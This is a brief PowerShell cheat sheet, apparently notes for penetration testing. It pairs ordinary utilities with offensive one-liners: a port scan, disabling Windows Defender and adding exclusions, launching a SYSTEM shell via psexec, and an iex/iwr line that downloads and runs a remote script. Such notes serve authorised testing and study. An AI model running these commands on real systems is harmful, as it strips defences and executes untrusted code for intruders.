# Powershell

### General

#### Compact loop

```bash
1,2,3,4 | % {write-host $_}
```

#### Scan selected ports

```bash
22,53,80,443,445 | % { Test-Connection -ComputerName <ip> -Port $_ }
```

#### Unzip

```bash
Expand-Archive <>
Add-Type -assembly 'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory("<archive path>","<target dir>")
```

#### Check for hidden streams

```bash
Get-Item -Stream * <path>
```

#### Disable Windows Defender

```bash
powershell.exe -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Add Defender Exception

```text
Add-MpPreference -ExclusionPath <path>
```

#### Check for Constrained Language Mode

```bash
$ExecutionContext.SessionState.LanguageMode
```

#### Inject .ps1 into session

```bash
Invoke-Command -FilePath <script> -Sessions $sessions
Enter-PSSession -Session $sess
```

#### Run cmd.exe as SYSTEM

```text
psexec.exe -i -s %SystemRoot%\system32\cmd.exe
```

#### File Transfer & Execution

```text
iex(iwr http://<ip>/x.ps1 -usebasicparsing)
```

#### Prevent Output Truncation

```text
| Ft -autosize -wrap
| fl
```

### Encrypt files

```bash
# https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
$key = New-CryptographyKey -Algorithm AES  
# Encrypt the file 
Protect-File '.\secrets.txt' -Algorithm AES -Key $key -RemoveSource 
# Decrypt the file 
Unprotect-File '.\secrets.txt.AES' -Algorithm AES -Key $key -RemoveSource
```

### Alternate Data Stream \(ADS\)

```bash
powershell -command "get-item <file> -stream *"
powershell -command "get-content <file> -stream root.txt"
```

